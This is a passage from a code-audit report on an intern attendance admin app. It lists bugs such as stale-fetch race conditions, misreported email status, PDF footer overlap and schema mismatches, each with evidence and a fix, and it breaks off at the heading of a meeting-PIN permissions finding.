lines 960-964 `bulkInternIds.split(/[\n,]+/).filter((id) => id.trim().length > 0).length` vs line 470 `const ids = [...new Set(rawIds)]; // remove duplicate IDs`
```

**Fix:** Reuse the same dedupe logic for the counter (extract a `parseBulkIds(text)` helper used by both).

## [LOW] Excel Status column is parsed then discarded — imported "present" interns get whatever the sticky Status toggle says
`frontend/src/pages/AdminManualAttendanceMarking.jsx:711` · *logic-error*

**What's wrong:** `handleExcelUpload` reads the Status column purely as a filter (`status.toLowerCase() === "present"`) and then throws it away; the actual write uses the page-level `status` state, which persists across mode switches and is never reset after a mark.

**Failure:** Admin first marks one no-show Absent in Single mode (status state becomes "Absent" and stays there), then switches to Bulk, uploads the attendance Excel and clicks the submit button. All 40 interns that the Excel listed as PRESENT are written to the DB as Absent in one request. Nothing in the flow re-confirms the status; only the small button caption reflects it.

**Evidence:**
```
line 711 `if (internId && status.toLowerCase() === "present") { presentIds.push(internId); }` (local `status` from the sheet) vs lines 485-491 `const payload = { internIds: ids, date: selectedDate, status, mode, ... }` (component `status` state, initialised "Present" at line 362 and never reset).
```

**Fix:** Reset `status` to "Present" after a successful mark, and/or warn when an Excel/PDF import is combined with status !== "Present".

# Admininternattendance — 16 findings

## [HIGH] Overlapping date fetches have no cancellation or sequence guard — a stale response overwrites newer data
`frontend/src/pages/Admininternattendance.jsx:600` · *race-condition*

**What's wrong:** `fetchAttendance(date)` (lines 600-616) fires `Promise.all([getMeetingByDate, getDailyByDate])` and unconditionally calls `setMeetingData`/`setDailyData` when it resolves. The driving effect (lines 618-620) re-runs on every `selectedDate` change with no AbortController, no request-sequence/generation counter, and no ignore-stale flag in a cleanup function. `<input type="date">` fires `onChange` on every intermediate *valid* date, so typing a year emits four changes (0002-08-04, 0020-08-04, 0202-08-04, 2026-08-04) and therefore four concurrent pairs of requests. Whichever pair resolves last wins, regardless of which one the user actually asked for. `setLoading(false)` in the `finally` also clears the spinner as soon as the *first* pair returns, so the UI looks settled while other requests are still in flight.

**Failure:** Admin is on 2026-08-04 and types 2026-08-03 into the date field (or clicks the date, then quickly clicks "Today"). Two request pairs go out. The 08-03 pair hits a cold query and takes 2s; the 08-04 pair returns in 300ms. `setMeetingData(meeting)` runs a second time with the 08-03 payload. The heading and the date input both read "Tuesday, August 4, 2026" and the tab badges show the 08-04 counts momentarily, but the table body, the row count, and every subsequent Export-PDF decision (`meetingData.count === 0`) are computed from August 3's records. The admin reads and reports the wrong day's attendance with no visual cue that anything went wrong.

**Evidence:**
```
const fetchAttendance = async (date) => {
  setLoading(true);
  setMeetingData(null);
  setDailyData(null);
  try {
    const [meeting, daily] = await Promise.all([
      attendanceApi.getMeetingByDate(date),
      attendanceApi.getDailyByDate(date),
    ]);
    setMeetingData(meeting);   // <- no check that `date` is still selectedDate
    setDailyData(daily);
  } ...
};

useEffect(() => {
  fetchAttendance(selectedDate);
}, [selectedDate]);   // <- no cleanup / abort
```

**Fix:** Guard the effect with a cancellation token: `useEffect(() => { let cancelled = false; (async () => { ...; if (!cancelled) { setMeetingData(m); setDailyData(d); } })(); return () => { cancelled = true; }; }, [selectedDate])`, and/or pass an `AbortController.signal` into both fetches and abort it in the cleanup. Also debounce `setSelectedDate` from the date input so partial years don't each trigger a round trip.

## [HIGH] "Send Report" reports success when no email was sent, and reports "all interns attended" when the email actually failed
`frontend/src/pages/Admininternattendance.jsx:685` · *wrong-status-reported*

**What's wrong:** The modal decides its message from `result.result?.emailSent`. In `WeeklyMeetingAttendanceService.performWeeklyMeetingAttendanceCheck` (backend/services/weeklymeetingattendanceservice.js:669-681) `results.emailSent = true` is set whenever `emailResult.success` is truthy — and `sendNonAttendanceEmailWithExcel` returns `{ success: true, skipped: true }` when there are zero non-attendees (lines 397-406), i.e. when no mail was sent at all. Conversely, a real SMTP failure returns `{ success: false, error }` (line 529), which sets `emailSent = false` and drives the frontend into the *other* branch. So both flags are inverted relative to what the two toast strings claim. `triggerAttendanceReport` (backend/controllers/admininternAttendanceController.js:456-473) always returns `success: true` on any non-throwing path, so the `else` branch at line 693 that surfaces `result.error` is unreachable.

**Failure:** Case A: every active intern attended a meeting in the last 14 days. No email is generated or sent. The admin clicks Send Report and sees a green toast "Report sent to 1 recipient(s) ✓" and the modal closes — they believe managers were notified. Case B: GMAIL_PASS is wrong, so `transporter.sendMail` throws and nothing is delivered. The admin sees a green *success* toast reading "Check complete — all interns attended", so a genuine delivery failure is presented as a clean bill of health for the whole cohort.

**Evidence:**
```
// frontend Admininternattendance.jsx:684-695
const result = await attendanceApi.triggerReport(recipients);
if (result.success) {
  showToast(
    result.result?.emailSent
      ? `Report sent to ${recipients.length} recipient(s) ✓`
      : "Check complete — all interns attended",
    "success",
  );

// backend/services/weeklymeetingattendanceservice.js:397-406
if (nonAttendingInterns.length === 0) {
  return { success: true, skipped: true, reason: "All interns attended ..." };
}
// ...:669-681
if (emailResult.success) { results.emailSent = true; ... }  // true even when skipped
else { results.emailSent = false; results.emailError = emailResult.error; }
```

**Fix:** In the service, set `results.emailSent = emailResult.success && !emailResult.skipped;` and propagate `results.emailSkipped` / `results.emailError`. In the page, branch on all three: `emailError` → red "Email failed: …" toast; `emailSkipped` → blue info "No non-attendees — nothing to send"; otherwise the green "Report sent" toast.

## [MEDIUM] The Excel and Email absentee buttons produce different lists — the emailed report ignores today's meeting scans
`backend/controllers/admininternAttendanceController.js:555` · *logic-error*

**What's wrong:** The two buttons in the "Absentees List" toolbar use two different attendance predicates over the same 14-day window. `exportNonAttendanceExcel`'s local `hasAttendedMeeting` (lines 549-564) only requires `workingDayStrings.has(recordDate)` where `recordDate` is the Colombo calendar day. `WeeklyMeetingAttendanceService.hasAttendedMeetingInPastTwoWeeks` (backend/services/weeklymeetingattendanceservice.js:195-207), which backs the Email button, additionally requires `recordDate.isSameOrBefore(endDate)` where `endDate = moment().tz(TZ).startOf("day")` (line 126) — i.e. today at 00:00. Meeting attendance rows are written with `date: attendanceTime`, the real scan timestamp (backend/services/attendanceWorkflowService.js:558 and 624), not a normalised midnight, so any meeting scanned today at any time after 00:00 fails `isSameOrBefore(endDate)` and is discarded, even though today is in `workingDayStrings`.

**Failure:** Intern IT2401 has skipped meetings for two weeks and finally scans the meeting QR today at 10:05 AM. The admin clicks "Excel" under Absentees List: IT2401 is correctly absent from the sheet. The admin then clicks "Email" in the same toolbar to send that list to management: IT2401 IS in the emailed spreadsheet as a non-attendee with "Last Meeting Attended" showing a two-week-old date. The intern is escalated to their supervisor for a meeting they demonstrably attended a few hours earlier.

**Evidence:**
```
// admininternAttendanceController.js:555-563 (Excel button)
return intern.attendance.some((record) => {
  const recordDate = moment(record.date).tz(TZ).format("YYYY-MM-DD");
  ...
  return record.status === "Present" &&
    MEETING_ATTENDANCE_TYPES.has(recordType) &&
    workingDayStrings.has(recordDate);
});

// weeklymeetingattendanceservice.js:200-206 (Email button)
return (
  recordDate.isSameOrAfter(startDate) &&
  recordDate.isSameOrBefore(endDate) &&   // endDate = today 00:00 -> drops today
  record.status === "Present" && ...
);
```

**Fix:** Delete the redundant `isSameOrAfter/isSameOrBefore` pair in `hasAttendedMeetingInPastTwoWeeks` and rely solely on `workingDayStrings.has(dateStr)` (which already bounds the window), or change `endDate` to `moment().tz(TZ).endOf("day")`. Better still, export the single predicate from the service and have the controller import it so the two buttons cannot drift again.

## [MEDIUM] PDF first-page row budget omits the bottom margin, so the last rows are printed across the page footer
`backend/controllers/dailyAttendancePdfTemplate.js:61` · *export-pdf*

**What's wrong:** `usableRest` subtracts `PAGE_MARGIN` twice (top margin and bottom margin) but `usableFirst` subtracts it only once, and the same wrong expression is duplicated in the render loop (lines 254-259). Measured against the actual layout: `drawFirstPageHeader` returns y = 202 (40 top margin + 162 of header, not the 172 the constant assumes), and the column-header row measures ~34.4pt because the two-line labels "Trainee\nID" and "Field of\nSpecialization" exceed the 32pt floor. First data row therefore starts at y ≈ 236.4, and the last legal y before the footer is `PAGE_HEIGHT - PAGE_MARGIN - FOOTER_HEIGHT` = 776.89, leaving 540.5pt of real space. `usableFirst` hands the loop 572.89pt — ~32pt of phantom space, i.e. more than one 25.2pt row. Identical defect in backend/controllers/meetingAttendancePdfTemplate.js lines 61-66 and 251-256.

**Failure:** Admin picks a date with 25+ present interns and clicks Export PDF (either tab). The loop packs 22 rows onto page 1; row 22 spans y 765.6-790.8. `drawFooter` then writes "TalentHub Intern Management System • Daily Attendance • Page 1 of 2" at y 776.89, directly on top of that row. The last intern's name, institute and check-in time on page 1 come out overprinted with the footer text and are unreadable in the report that gets circulated.

**Evidence:**
```
const usableFirst =
  PAGE_HEIGHT - PAGE_MARGIN - FIRST_PAGE_HEADER_H - COL_HEADER_H - FOOTER_HEIGHT;
const usableRest =
  PAGE_HEIGHT - PAGE_MARGIN - COL_HEADER_H - FOOTER_HEIGHT - PAGE_MARGIN;
//                                                            ^^^^^^^^^^^ present here, missing above
```

**Fix:** Stop using magic constants: capture the real cursor after drawing the header (`const y0 = drawFirstPageHeader(...) + drawRow(headerLabels...)`) and compute `remaining = (PAGE_HEIGHT - PAGE_MARGIN - FOOTER_HEIGHT) - y0`. Do the same for continuation pages. Since `calcTotalPages` must agree with the render loop, factor the budget into one shared helper used by both. Apply to both dailyAttendancePdfTemplate.js and meetingAttendancePdfTemplate.js.

## [MEDIUM] Daily PDF hard-codes "Present" in the Status column, erasing the Late status the controller computes
`backend/controllers/dailyAttendancePdfTemplate.js:246` · *export-pdf*

**What's wrong:** `generateDailyAttendancePdf` builds each row with a literal `"Present"` for the Status column, even though `getDailyPresentsOnDate` (backend/controllers/admininternAttendanceController.js:373-384) explicitly computes and returns `status: record.attendance === "late" ? "Late" : "Present"` on every intern object it emits. The column exists precisely to carry that value and the payload is already on the object as `intern.status`, but it is never read. The frontend Daily tab has the same omission — it renders `intern.type` in the last column and never surfaces `intern.status` anywhere.

**Failure:** An intern's daily attendance is recorded as `late`. The controller returns `{ ..., status: "Late" }` for them. The admin exports the Daily Attendance PDF for that date and hands it to a supervisor: the intern's row reads "Present" in the Status column, identical to everyone who arrived on time. There is no way to tell late arrivals from on-time arrivals in the official report, so the Status column is decorative and the late data is silently lost at the export boundary.

**Evidence:**
```
return [
  String(intern.id),
  intern.name || "—",
  intern.fieldOfSpecialization || "—",
  intern.institute || "—",
  timeStr,
  "Present",          // <- intern.status is available and ignored
];
```

**Fix:** Replace the literal with `intern.status || "Present"`, and mirror it on the page by rendering a Late/Present badge next to the check-in time in the Daily tab (Admininternattendance.jsx:493-508).

## [MEDIUM] Daily attendance falls back to DailyRecord fields that were deleted from the schema, so the fallback branch never matches
`backend/controllers/admininternAttendanceController.js:264` · *api-contract-mismatch*

**What's wrong:** `getDailyPresentsOnDate` queries `DailyRecord.find({ date: dateStr, attendance: { $in: ["present", "late"] } })` and later reads `record.attendanceTime`, `record.checkOutTime` and `record.attendance` (lines 373-383). None of those paths exist in backend/models/DailyRecord.js any more — commit c6f7ea2 removed `attendance`, `attendanceTime`, `checkOutTime` and `meetingAttendance` from the schema, leaving only internId/traineeId/date/stack/task/progress/blockers/status. Mongoose 8 keeps `strict: true` for writes, so `attendanceWorkflowService.markDailyAttendance`'s `$set: { attendance: "present", attendanceTime }` (backend/services/attendanceWorkflowService.js:183-186) and `$set: { checkOutTime }` (lines 288-292) are silently stripped and never persisted. Mongoose 7+ defaults `strictQuery` to false, so the filter above IS sent to MongoDB and matches zero documents written since that commit. Consequently `dailyRecordInternIds` is always empty, the `{ _id: { $in: dailyRecordInternIds } }` arm of the `$or` at line 317 is dead, and the whole reconciliation loop at lines 368-385 (the only place `status: "Late"` is ever produced) is unreachable.

**Failure:** Pick any date after the DailyRecord schema trim and open the Daily tab. Any intern whose daily presence is recorded only against DailyRecord — legacy rows, or any future writer that relies on the documented `attendance: "present"` contract the workflow service still tries to write — is absent from the list, absent from the count badge, absent from the Daily PDF, and is counted as "missing daily check-in" by the Meeting-Without-Daily Excel export. No error is logged; the page just shows a smaller number than reality.

**Evidence:**
```
// admininternAttendanceController.js:263-267
DailyRecord.find({
  date: dateStr,
  attendance: { $in: ["present", "late"] },   // field not in DailyRecordSchema
}).lean(),

// models/DailyRecord.js — schema fields are only:
// internId, traineeId, date, stack, task, progress, blockers, status

// services/attendanceWorkflowService.js:183-186 — stripped by strict:true
$set: { attendance: "present", attendanceTime },
```

**Fix:** Decide on one source of truth. Either restore `attendance`/`attendanceTime`/`checkOutTime` to DailyRecordSchema (so the workflow service's `$set` persists again and the fallback works), or delete the dead DailyRecord fallback from `getDailyPresentsOnDate` and the corresponding `$set` calls in attendanceWorkflowService, and move the Late determination onto the `Intern.attendance` entry. Do not leave both halves half-wired.

## [MEDIUM] Daily tab shows the latest daily mark of the day as the check-in time, not the actual first check-in
`backend/controllers/admininternAttendanceController.js:351` · *logic-error*

**What's wrong:** `getDailyPresentsOnDate` derives the displayed check-in from `reconciledAttendance.entry` / `reconciledAttendance.markedAt`, and `buildDailyAttendanceByDate` (backend/utils/attendanceHistory.js:53-60) keeps whichever entry has the **greatest** `markedAtMs` for a given Colombo date. An intern can legitimately hold more than one daily-type row for the same day: `markManualAttendance` writes `type: "manual_daily"` with `timeMarked: now` (backend/controllers/manualAttendanceController.js:95-103) and its duplicate guard only collapses rows of the *same* type, so a `manual_daily` added by an admin coexists with an earlier `daily_qr` or `face` row. The reconciler then promotes the later admin mark over the real scan. The same happens via the logbook path, whose duplicate check compares `new Date(a.date).toISOString().split("T")[0]` (backend/controllers/dailyRecordController.js:35) — a UTC day key against a Colombo day string, which never matches the Colombo-midnight rows written by the QR/face flow, so a second `type: "daily"` row is appended.

**Failure:** Intern IT2412 scans the daily QR at 08:05 AM. At 4:30 PM an admin uses Mark Attendance to also record her as daily present (correcting a report). Two rows now exist for the day: daily_qr @ 08:05 and manual_daily @ 16:30. On /admin/intern-attendance → Daily tab for that date, her Check-in column reads "04:30 PM" and her Type badge reads "Manual Daily". The 08:05 scan is invisible, and the Daily PDF exports 04:30 PM as her arrival time — she looks like a late/no-show arrival in the record handed to her supervisor.

**Evidence:**
```
const latest = reconciledAttendance.entry;
dailyByIntern.set(internId, {
  ...getInternDetails(intern),
  timeMarked: moment(reconciledAttendance.markedAt || latest.date)
    .tz(TZ).format("hh:mm A"),
  ...
  type: latest.type || "daily",

// utils/attendanceHistory.js:53 — picks the LATEST, not the earliest
const latest = markedAtMs > current.markedAtMs ? {...} : current;
```

**Fix:** Check-in must be the earliest daily mark of the day and check-out the latest: in `buildDailyAttendanceByDate` keep `markedAtMs < current.markedAtMs ? candidate : current` for the entry/markedAt (the checkout merge already takes the max separately). Separately, fix the Colombo/UTC day-key mismatch in dailyRecordController.js:35 by using `getColomboDateKey(a.date)` from utils/attendanceHistory so the logbook path stops appending duplicate daily rows.

## [MEDIUM] Meeting PDF sorts rows with Number(a.id) - Number(b.id), producing NaN and arbitrary order for non-numeric Trainee IDs
`backend/controllers/meetingAttendancePdfTemplate.js:237` · *export-pdf*

**What's wrong:** `generateMeetingAttendancePdf` re-sorts the already-sorted list with `[...interns].sort((a, b) => Number(a.id) - Number(b.id))`. `Trainee_ID` is `{ type: String }` in backend/models/Intern.js and `getInternDetails` falls back to the literal string `"Unknown"` when it is missing (admininternAttendanceController.js:152). `Number("IT21001")` and `Number("Unknown")` are both NaN, and a comparator that returns NaN leaves V8's TimSort with an inconsistent ordering relation, so affected elements land in effectively arbitrary positions. This also silently contradicts the controller, which already sorted lexicographically by `String(id).toUpperCase()` (lines 247-249) — the Daily PDF preserves that order while the Meeting PDF discards it, so the same cohort comes out in two different orders in the two reports.

**Failure:** Trainee IDs are alphanumeric (or one intern record is missing Trainee_ID and renders as "Unknown"). Export the Meeting Attendance PDF: every comparison involving those rows yields NaN, so the ID column is not sorted at all — rows appear in whatever order the sort happened to leave them, sometimes shuffling between exports of identical data. An admin cross-checking a printed roster by ID cannot find an intern where they expect them.

**Evidence:**
```
// Sort ascending by numeric Trainee ID
const sorted = [...interns].sort((a, b) => Number(a.id) - Number(b.id));
// Intern.js:  Trainee_ID: { type: String, required: true, unique: true }
// admininternAttendanceController.js:152:  id: intern.Trainee_ID || "Unknown",
```

**Fix:** Drop the re-sort (the controller already sorted the array) or use a NaN-safe comparator: `String(a.id).localeCompare(String(b.id), undefined, { numeric: true, sensitivity: "base" })`, which orders numeric IDs naturally and alphanumeric ones deterministically. Use the identical comparator in the controller and both PDF templates.

## [MEDIUM] Excel exports write to a fixed temp filename and unlink it after streaming — concurrent downloads corrupt each other
`backend/controllers/admininternAttendanceController.js:690` · *race-condition*

**What's wrong:** `exportNonAttendanceExcel` writes to `backend/temp/Non_Attendance_Report_${todayStr}.xlsx` (lines 689-692) and `exportMeetingWithoutDailyExcel` writes to `backend/temp/Meeting_Without_Daily_Report_${dateStr}.xlsx` (lines 782-784). Neither name contains a request id, user id, or timestamp, so every caller on a given day (or a given selected date) targets the exact same path. Each handler then calls `res.download(filePath, ...)` and `fs.unlinkSync(filePath)` in the completion callback, so one request's cleanup deletes the file another request is still streaming, and one request's `XLSX.writeFile` truncates and rewrites the file the other is mid-read on.

**Failure:** Two admins click "Excel" under Absentees List within a few seconds of each other (or one admin double-clicks — the button is only disabled per-tab via local `exportingNonAttendance` state, which does nothing across sessions). Request A writes the file and begins streaming. Request B overwrites the same path with its own workbook, then A's download callback fires and `fs.unlinkSync` deletes it. B's response is truncated or aborts mid-stream, and the browser saves a zero-byte or corrupt .xlsx that Excel refuses to open — with no server-side error surfaced to either admin.

**Evidence:**
```
const todayStr = moment().tz(TZ).format("YYYY-MM-DD");
const filename = `Non_Attendance_Report_${todayStr}.xlsx`;
const filePath = path.join(tempDir, filename);
XLSX.writeFile(workbook, filePath);

res.download(filePath, filename, (err) => {
  if (err) console.error(...);
  try { fs.unlinkSync(filePath); } catch (_) {}
});
```

**Fix:** Skip the filesystem entirely: `const buf = XLSX.write(workbook, { type: "buffer", bookType: "xlsx" })`, set Content-Type/Content-Disposition/Content-Length and `res.send(buf)`. If a temp file is unavoidable, make the on-disk name unique (`${crypto.randomUUID()}.xlsx`) while keeping the friendly name as the second `res.download` argument.

## [MEDIUM] attendance.manage-only controls are rendered to supervisors, who only hold attendance.view
`frontend/src/pages/Admininternattendance.jsx:898` · *permissions*

**What's wrong:** The page is reachable by anyone holding `attendance.view` (AdminNavigation.jsx:48 gates the nav link on that permission; the route in AppRoutes.jsx:173-176 is wrapped only in `<AdminRoute />` with no per-permission check). Three controls on it require `attendance.manage`, because `routePermission` in backend/middleware/adminAuth.js:33-35 maps any non-GET under `/attendance`, `/face-attendance` or `/manual-attendance` to `attendance.manage`: the SLT Location toggle (PUT /admin/attendance/settings, lines 898-909), the "Mark Attendance" button that navigates to /admin/manual-attendance (lines 912-918), and the "Email" button that POSTs /admin/attendance/trigger-report (lines 1030-1039). None is wrapped in `hasAdminPermission("attendance.manage")` from utils/adminAuth.js. The `supervisor` role in backend/config/adminPermissions.js:12-15 is exactly this case — it has `attendance.view` and not `attendance.manage`.

**Failure:** A supervisor signs in and opens Attendance. (1) They flip the SLT Location toggle; it visually switches (optimistic `setSltLocationRequired(nextValue)` at line 639), then snaps back a moment later with a red toast — the control looks broken. (2) They click "Email", the modal opens, they add a recipient and click Send Report; the backend returns 403 and they get a bare "Request failed" toast (see the separate `.error` vs `.message` finding). (3) They click "Mark Attendance" and land on a fully rendered /admin/manual-attendance page where every search and every save 403s. Every path is a dead end that the UI advertised as available.

**Evidence:**
```
<button
  type="button"
  onClick={handleToggleLocationRequirement}
  disabled={settingsLoading || settingsSaving}   // <- no permission check
  aria-label="Toggle SLT location requirement"
/>
...
<button onClick={() => navigate("/admin/manual-attendance")}>Mark Attendance</button>
...
<motion.button onClick={() => setShowTriggerModal(true)}>Email</motion.button>

// backend/config/adminPermissions.js:12
supervisor: ["dashboard.view", "interns.view", "daily_logs.view", "attendance.view", "leave.view"],
```

**Fix:** Import `hasAdminPermission` from ../utils/adminAuth, compute `const canManage = hasAdminPermission("attendance.manage")` once, and render the toggle, the Mark Attendance button and the Email button only when `canManage` (or render them disabled with a "requires attendance.manage" tooltip). Add the same guard to the /admin/manual-attendance route element.

## [MEDIUM] Failed attendance fetch leaves the page showing a false "No attendance records" empty state
`frontend/src/pages/Admininternattendance.jsx:604` · *error-handling*

**What's wrong:** `fetchAttendance` clears `meetingData`/`dailyData` to null *before* awaiting (lines 602-603) and, on failure, only fires a toast — it never records an error state. `activeData` (line 703) then becomes null, `filtered` becomes `[]`, `loading` is false, and `searchTerm` is empty, so the render at lines 1256-1274 skips both the loading branch and the "No results" search branch and mounts `<AttendanceTable filtered={[]} />`, whose zero-length branch (lines 308-320) prints "No attendance records / No interns were marked present on <date>". The toast auto-dismisses after 4s, after which nothing on screen distinguishes a backend failure from a genuinely empty day. There is no retry affordance.

**Failure:** The backend is restarted, or the admin's JWT expires, or a supervisor without attendance.view opens the page. Both requests reject. Four seconds later the admin is looking at a clean page headed "Meeting Attendance — Tuesday, August 4, 2026" with the message "No interns were marked present on Tuesday, August 4, 2026". They conclude that nobody attended and escalate a full-cohort absence, when in fact no data was ever retrieved.

**Evidence:**
```
} catch (err) {
  showToast(err.message || "Failed to load attendance", "error");
} finally {
  setLoading(false);
}
// ...no error state is set; render falls through to:
if (filtered.length === 0) {
  return ( ... <h3>No attendance records</h3>
    <p>No interns were marked present on {formatDateLabel(selectedDate)}.</p> ... );
}
```

**Fix:** Add `const [error, setError] = useState(null)`; set it in the catch and clear it at the start of each fetch. Render a dedicated error panel with a Retry button ahead of the empty-state branch: `{error ? <ErrorPanel message={error} onRetry={() => fetchAttendance(selectedDate)} /> : ...}`. Also stop nulling the data before the await so a transient failure does not blank out data that is still valid.

## [LOW] Auth and permission errors surface as "Request failed" because the API helpers read `.error` while the middleware returns `.message`
`frontend/src/pages/Admininternattendance.jsx:62` · *error-handling*

**What's wrong:** `getMeetingByDate` (line 62), `getDailyByDate` (line 71) and `triggerReport` (line 98) all build their error from `(await res.json()).error`. The admin auth layer never uses that key: `requireAdmin` returns `{ message, code: "ADMIN_REQUIRED" | "ACCOUNT_INACTIVE" }` and `requirePermission` returns `{ message: "Permission required: …", code: "FORBIDDEN" }` (backend/middleware/adminAuth.js:7, 11, 24). So every 403 collapses to the generic fallback string. `getSettings`/`updateSettings` (lines 126, 137) correctly read `.message`, which is the inconsistency. Additionally, `await res.json()` is unguarded — a non-JSON error body (proxy 502, HTML error page) makes `res.json()` reject and the thrown value becomes a `SyntaxError`, whose message is what the toast displays.

**Failure:** A supervisor (attendance.view only) opens the Email modal and clicks Send Report. The backend replies 403 `{"message":"Permission required: attendance.manage","code":"FORBIDDEN"}`. The toast reads "Request failed" with no indication that this is a permissions problem, so the admin retries and then files a bug about the Email button being broken. Same for a deactivated admin account, which returns `{"message":"Admin account is inactive or unavailable."}` and also shows only "Request failed".

**Evidence:**
```
if (!res.ok) throw new Error((await res.json()).error || "Request failed");

// backend/middleware/adminAuth.js:24
return res.status(403).json({ message: `Permission required: ${permission}`, code: "FORBIDDEN" });
```

**Fix:** Add one shared helper: `const readError = async (res, fallback) => { try { const b = await res.json(); return b.error || b.message || fallback; } catch { return `${fallback} (HTTP ${res.status})`; } };` and use it in all six helpers. While there, handle 401/403 explicitly — clear the session and redirect to /admin-login on 401 rather than showing a toast the user cannot act on.

## [LOW] Toast auto-dismiss timer restarts on every parent re-render, so toasts can persist indefinitely
`frontend/src/pages/Admininternattendance.jsx:149` · *react-effect*

**What's wrong:** `Toast`'s dismiss effect lists `onClose` in its dependency array, and the parent passes a freshly allocated arrow `onClose={() => setToast(null)}` on every render (line 727). Every parent re-render therefore tears down the pending 4s `setTimeout` and schedules a brand new one, so the countdown restarts rather than progressing. Any re-render cadence faster than 4s keeps the toast on screen forever, and the toast overlays the bottom-right of the viewport (`fixed bottom-6 right-6 z-50`).

**Failure:** An export fails and the red "Export failed" toast appears. The admin immediately starts typing in the search box to look for a specific intern. Each keystroke re-renders `AdminInternAttendance`, which allocates a new `onClose`, which resets the timer. The stale error toast stays pinned over the bottom-right of the table for as long as they keep typing, covering rows and the pagination control, long after the error it describes is irrelevant.

**Evidence:**
```
const Toast = ({ toast, onClose }) => {
  useEffect(() => {
    const t = setTimeout(onClose, 4000);
    return () => clearTimeout(t);
  }, [onClose]);          // <- new identity every parent render
...
{toast && <Toast toast={toast} onClose={() => setToast(null)} />}
```

**Fix:** Stabilise the callback with `const closeToast = useCallback(() => setToast(null), [])` and pass that, or key the effect on the toast payload instead: `useEffect(() => { const t = setTimeout(onCloseRef.current, 4000); return () => clearTimeout(t); }, [toast.text, toast.type])` with `onClose` held in a ref.

## [LOW] Clearing the date input renders "Invalid Date" in three places and fires a guaranteed-400 request
`frontend/src/pages/Admininternattendance.jsx:1052` · *date-handling*

**What's wrong:** The date `<input>` is uncontrolled against emptiness — `onChange={(e) => setSelectedDate(e.target.value)}` accepts the empty string that a native date picker emits when the user clears the field (Ctrl+A/Delete, or the browser's built-in clear control). `selectedDate = ""` then flows into `formatDateLabel`, which does `new Date("" + "T00:00:00")` → Invalid Date → `.toLocaleDateString(...)` returns the literal "Invalid Date", and into `fetchAttendance("")`, which hits `/admin/attendance/by-date?date=` and gets a 400 from the controller's `if (!dateStr)` guard (backend/controllers/admininternAttendanceController.js:404-407).

**Failure:** Admin selects the date field and presses Delete to retype it. The moment the field empties, the page fires both requests with an empty date, shows a red toast "date query param required (YYYY-MM-DD)", blanks the table, and renders "Meeting Attendance — Invalid Date" in the panel header, "…didn't mark daily attendance on Invalid Date" in the Meeting-Without-Daily card (line 1108), and "No interns were marked present on Invalid Date" in the empty state. A "Today" button also appears because `selectedDate !== today`.

**Evidence:**
```
<input
  type="date"
  value={selectedDate}
  onChange={(e) => setSelectedDate(e.target.value)}   // accepts ""
/>

const formatDateLabel = (dateStr) =>
  new Date(dateStr + "T00:00:00").toLocaleDateString("en-US", {...});  // "Invalid Date"
```

**Fix:** Ignore empty input: `onChange={(e) => e.target.value && setSelectedDate(e.target.value)}` (optionally also clamp with `max={today}`), and make `formatDateLabel` defensive — `const d = new Date(`${dateStr}T00:00:00`); return Number.isNaN(d.getTime()) ? "—" : d.toLocaleDateString(...)`. Bail out of `fetchAttendance` early when `!date`.

## [LOW] attendanceApi.exportMeetingExcel targets /admin/attendance/export-excel, which no route defines
`frontend/src/pages/Admininternattendance.jsx:87` · *api-contract-mismatch*

**What's wrong:** `exportMeetingExcel` builds `${API_BASE_URL}/admin/attendance/export-excel?date=${date}`. Grepping backend/routes/adminRoutes.js, the only attendance export routes registered under the `/api/admin` mount (backend/app.js:70) are `export-non-attendance-excel` (line 185), `export-meeting-pdf` (189), `export-daily-pdf` (193) and `export-meeting-without-daily` (197-200). There is no `export-excel` handler anywhere in the codebase — a repo-wide grep for `export-excel` returns only this one frontend line. The helper is currently unreferenced in the JSX, so it is dead code today, but it is a live trap: it looks like the working Excel export sitting two entries above it in the same object literal.

**Failure:** Anyone wiring an "Export Meeting Excel" button to this existing helper gets a 404 that `downloadBlob` converts to the opaque message "Download failed", with no hint that the endpoint simply does not exist. Because the response is JSON rather than a spreadsheet, a naive change to `downloadBlob` would instead save a .xlsx file containing an HTML/JSON 404 body.

**Evidence:**
```
exportMeetingExcel: (date) =>
  fetch(`${API_BASE_URL}/admin/attendance/export-excel?date=${date}`, {
    headers: getAuthHeaders(),
  }).then((res) =>
    downloadBlob(res, `Attendance_Report_${date}.xlsx`),
  ),
// adminRoutes.js registers: export-non-attendance-excel, export-meeting-pdf,
//                           export-daily-pdf, export-meeting-without-daily
```

**Fix:** Delete `exportMeetingExcel` from the `attendanceApi` object, or implement `GET /attendance/export-excel` in adminRoutes.js plus a controller alongside the other export handlers if a per-date meeting spreadsheet is actually wanted.

## [LOW] Export PDF ignores the active search filter while the header advertises a filtered count
`frontend/src/pages/Admininternattendance.jsx:1188` · *export-consistency*

**What's wrong:** When `searchTerm` is set, the panel header reports `${filtered.length} of ${activeData.count} shown` (line 1170) and the table renders only `filtered`. The Export PDF handler, however, sends only `selectedDate` to `/admin/attendance/export-meeting-pdf` / `export-daily-pdf` (lines 1188 and 1205); the server recomputes the full day's list from scratch via `getPresentsOnDate` / `getDailyPresentsOnDate` and has no knowledge of the client-side filter. The button's enable/disable logic is likewise keyed on the unfiltered `meetingData?.count` / `dailyData?.count` (lines 1217-1224), so it stays enabled even when the visible table is empty because of a search.

**Failure:** Admin types "University of Moratuwa" to isolate that institute; the header reads "12 of 143 shown" and 12 rows are visible. They click Export PDF expecting those 12. The downloaded file is titled "Intern Attendance Report" with "Total Attendance Count: 143" and lists every intern for the day. The mismatch is only discoverable by opening the PDF.

**Evidence:**
```
exportMeetingPdf: (date) =>
  fetch(`${API_BASE_URL}/admin/attendance/export-meeting-pdf?date=${date}`, ...)
// no search term is transmitted, yet the header above the button reads:
{searchTerm ? `${filtered.length} of ${activeData.count} shown` : ...}
```

**Fix:** Either pass the filter to the server (`&q=${encodeURIComponent(searchTerm)}` and apply the same name/id/field/institute match inside `getPresentsOnDate` / `getDailyPresentsOnDate`), or make the intent explicit in the UI — relabel to "Export full day PDF" and show a hint when `searchTerm` is active that the export is not filtered.

# AdminFaceAttendance — 20 findings

## [CRITICAL] Meeting PIN endpoint is exposed to every logged-in intern (read + rotate + stop)
`backend/routes/faceAttendanceRoutes.js:25` · *permissions-auth*

